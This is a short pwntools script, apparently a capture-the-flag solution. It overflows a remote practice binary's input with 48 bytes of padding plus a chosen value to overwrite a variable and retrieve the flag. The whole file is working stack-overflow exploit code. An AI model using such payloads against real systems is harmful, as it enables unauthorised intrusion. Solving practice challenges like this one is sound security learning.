from pwn import *
import sys

# python exploit.py REMOTE thekidofarcrania.com 35235

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 48
padding = 'A' * offset
overwrite = 0x67616c66

# Build the payload
payload = flat([
    padding,
    overwrite
])

# Send the payload
io.recvuntil('Input some text:')
io.sendline(payload)

io.recvuntil('You did it! Congratuations!')

flag = io.recv()
success(flag)
